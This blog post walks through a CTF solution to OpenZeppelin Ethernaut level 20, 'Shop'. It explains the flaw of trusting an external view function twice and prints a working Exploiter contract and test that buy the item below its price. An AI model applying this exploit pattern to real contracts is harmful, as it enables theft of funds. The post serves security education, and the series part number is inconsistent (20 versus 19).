---
title: 'Ethernaut Challenge #20 Solution — Shop'
excerpt: This is Part 20 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to find a way to buy the item from the `Shop` contract for a price lower compared to the one for which the item is sold.
coverImage:
  url: '/assets/blog/ethernaut/shop.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-10T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/shop.svg'
---

This is Part 19 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.medium.com/lets-play-ethernaut-ctf-learning-solidity-security-while-playing-1678bd6db3c4) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #20: Shop

> Сan you get the item from the shop for less than the price asked?
>
> Things that might help:
>
> - `Shop` expects to be used from a `Buyer`
> - Understanding restrictions of view functions
>
> Level author(s): [Ivan Zakharov](https://github.com/34x4p08)

The goal of this challenge is to find a way to buy the item from the `Shop` contract for a price lower compared to the one for which the item is sold.

## Study the contracts

Let's review the contract that is fairly small in code length

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

As we can see, we have a `price` inside the contract that represent the amount of `wei` that a `Buyer` must pay to purchase the item.

The item can also be purchased only if it **has not been sold yet**. This property is handled by the state variable `isSold` that is initialized to `false` and then changed to `true` in the `buy` function.

Let's see in detail the `buy` function

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```

This is the main function of the contract. It cast the `msg.sender` to `Buyer` and by doing that it expect that the sender of the transaction is a **Contract** that implements the `price` function defined in the `Buyer` interface.

The `function price() external view returns (uint256);` even if it's not explicit in the Challenge description should return the price that the **buyer** is willing to pay to purchase the shop's item.

The contract check if the Buyer's price (what the buyer is willing to pay) is greater than the Shop's price and check that the item has not been sold yet. If this requirement pass, it will update `isSold` to `true` and update the `price`'s value to `_buyer.price();` that in **theory** should be the same one returned just an instruction before, **right???**

This is not a real case scenario, it's just a challenge to explain a concept. There's no fund transfer involved in the transaction.

The key concept here is: you should **never** **blindly trust** what you expect **an external actor** will do, even if you define a specific interface with a logic that the external actor should trust.

**Never ever trust blindly things that are not under your control.**

Because **we** are the buyer, we can simply implement the `price` function like this

```solidity
function price() external view returns (uint256) {
    return victim.isSold() ? 1 : 1000;
}
```

Because `price` is a `view` function we cannot have an internal state variable to change the `uint256` returned by the function, but we are enabled to make external call functions that are marked as `view` or `pure`.

Just as a reminder from the Solidity Documentation about [what `view` function can and can't do](https://docs.soliditylang.org/en/latest/contracts.html#view-functions):

> A `view` function cannot modify the state of the contract. In particular it cannot
>
> - Write to state variables.
> - Emit events.
> - Create other contracts.
> - Use selfdestruct.
> - Send Ether via calls.
> - Call any function not marked view or pure.
> - Use low-level calls.
> - Use inline assembly that contains certain opcodes.

## Solution code

First, we need to deploy a Contract that inherit and implements the `Buyer` interface required by the `Shop`

```solidity
contract Exploiter {
    // victim reference
    Shop private victim;

    // trigger the exploit
    function buy(Shop _victim) external {
        victim = _victim;
        victim.buy();
    }

    // if the item has not been sold we return what the Shop's want to see
    // but after that (by knowing the Shop logic) we ruturn what we are really
    // going to pay to purchase the item (much much lower compared to the real item's price)
    function price() external view returns (uint256) {
        return victim.isSold() ? 1 : 1000;
    }
}
```

Now we can deploy the exploiter contract and run the test to solve the challenge

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // deploy the exploiter contract
    Exploiter exploiter = new Exploiter();

    // trigger the exploit and buy the item
    exploiter.buy(level);

    // assert that we have solved the challenge
    assertEq(level.isSold(), true);

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [Shop.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Shop.t.sol)

## Further reading

- [Solidity Docs: view functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
